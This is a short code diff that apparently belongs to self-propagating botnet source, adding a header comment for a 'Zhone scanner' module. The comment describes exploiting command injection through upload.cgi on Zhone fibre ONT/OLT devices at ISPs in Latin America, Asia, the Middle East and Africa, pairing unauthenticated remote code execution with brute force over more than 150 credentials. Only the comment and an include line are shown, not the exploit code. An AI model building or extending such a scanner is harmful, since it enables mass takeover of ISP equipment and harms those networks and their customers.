@@ -1,5 +1,14 @@
 #ifdef SELFREP
 
+/* ============================================================================
+ * ZHONE SCANNER - FTTH/OLT Command Injection (Port 80)
+ * ============================================================================
+ * Exploit: Zhone ONT/OLT command injection via upload.cgi
+ * Targets: FTTH ISPs with Zhone equipment
+ * Regions: Latin America, Asia, Middle East, Africa
+ * Dual attack: Unauthenticated RCE + authenticated brute-force (150+ creds)
+ * ============================================================================ */
+
 #pragma once
 
 #include <stdint.h>
